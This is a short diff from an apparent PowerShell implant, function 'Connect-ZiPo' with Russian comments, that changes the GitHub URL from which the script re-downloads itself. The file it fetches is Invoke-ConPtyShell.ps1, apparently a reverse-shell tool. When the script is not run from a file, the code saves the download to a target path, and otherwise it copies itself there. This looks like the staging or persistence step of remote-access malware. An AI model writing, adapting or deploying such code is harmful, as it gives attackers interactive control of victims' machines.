@@ -21,7 +21,7 @@ function Connect-ZiPo {
         # Попытка получить путь к текущему скрипту
         if ([string]::IsNullOrWhiteSpace($PSCommandPath)) {
             # Если скрипт не был запущен как файл — скачаем себя по URL
-            $url = "https://raw.githubusercontent.com/levzipa/zippo/studytime/main/Invoke-ConPtyShell.ps1"
+            $url = "https://raw.githubusercontent.com/zipo0/studytime-/refs/heads/main/Invoke-ConPtyShell.ps1"
             Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
         } else {
             Copy-Item -Path $PSCommandPath -Destination $targetPath -Force
